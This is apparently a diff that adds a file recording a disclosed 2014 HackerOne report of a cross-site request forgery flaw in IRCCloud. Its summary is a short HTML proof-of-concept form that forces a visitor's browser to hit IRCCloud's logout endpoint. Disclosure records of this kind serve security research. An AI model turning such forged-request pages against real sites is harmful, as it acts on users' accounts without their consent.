@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/7516
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/gunda
+ReportedTo:IRCCloud(irccloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:13.06.2014 8:58:05
+
+Summary:
+
+<html>
+<body>
+<form action="https://www.irccloud.com/chat/logout">
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
